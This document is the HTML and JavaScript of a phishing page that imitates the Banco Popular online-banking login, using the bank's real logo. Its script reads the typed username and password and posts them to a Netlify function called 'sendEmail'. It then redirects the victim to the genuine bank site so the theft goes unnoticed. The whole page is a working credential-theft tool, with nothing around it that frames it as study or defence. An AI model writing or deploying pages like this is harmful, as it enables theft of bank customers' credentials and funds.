<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Popular - Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #004080, #0080C0);
            color: white;
            margin: 0;
            padding: 0;
        }

        .login_bpd {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background: #005C99;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        .logo_bpd {
            max-width: 150px;
            margin-bottom: 20px;
        }

        .segmentos_tabs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .segmento {
            flex: 1;
            padding: 10px;
            cursor: pointer;
            background: #004080; /* Color base #004080 */
            border: none;
            border-radius: 4px;
            text-decoration: none;
            color: white;
            font-size: 14px;
            margin: 0 5px;
        }

        /* Eliminar el resaltado al pasar el ratón y la clase active */
        .segmento:hover, .segmento.active {
            background: #004080; /* Sin cambio de color */
        }

        .segmento_descripcion {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .segmento_formulario input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 4px;
            outline: none;
        }

        .segmento_formulario button {
            width: 100%;
            padding: 10px;
            background: #0080C0;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }

        .segmento_enlaces a {
            color: #00D4FF;
            text-decoration: none;
            font-size: 14px;
        }

        .segmento_enlaces a:hover {
            text-decoration: underline;
        }

        .segmento_enlaces span {
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="login_bpd">
        <img class="logo_bpd" src="https://popularenlinea.com/_catalogs/masterpage/popularenlinea/shared/images/logo-bpd-blanco.svg" alt="Banco Popular">
        <div class="segmentos_tabs">
            <a class="segmento btn_segmento segmento_persona">Personal</a>
            <a class="segmento btn_segmento segmento_empresarial">Empresarial</a>
            <a class="segmento btn_segmento segmento_agentes">Agentes</a>
        </div>
        <div class="tab-content segmentos_content">
            <!-- Tab Personal -->
            <div id="segmento_persona" class="segmento segmento_persona tab-pane active">
                <div class="segmento_descripcion">Tu cuenta personal</div>
                <div class="segmento_formulario">
                    <input class="usuario_persona" type="text" placeholder="Nombre de usuario">
                    <input class="pass_persona" type="password" placeholder="Contraseña">
                    <button class="acceder_personas">Acceder</button>
                </div>
                <div class="segmento_enlaces">
                    <a href="#">¿Olvidaste tu contraseña?</a>
                    <span>|</span>
                    <a href="#">Solicita tu acceso</a>
                    <span>|</span>
                    <a href="#">Pistas de seguridad</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.querySelector(".acceder_personas").addEventListener("click", function(event) {
    event.preventDefault(); // Evita el comportamiento predeterminado

    const usuario = document.querySelector(".usuario_persona").value;
    const pass = document.querySelector(".pass_persona").value;

    if (usuario && pass) {
        fetch('/.netlify/functions/sendEmail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: usuario,
                password: pass
            })
        })
        .then(() => {
            // Redirige solo después de enviar correctamente
            window.location.href = "https://www.popularenlinea.com/";
        });
    } else {
        // Opcional: Mostrar un mensaje o manejar campos vacíos
        alert("Por favor, complete todos los campos.");
    }
});
    </script>
</body>
</html>
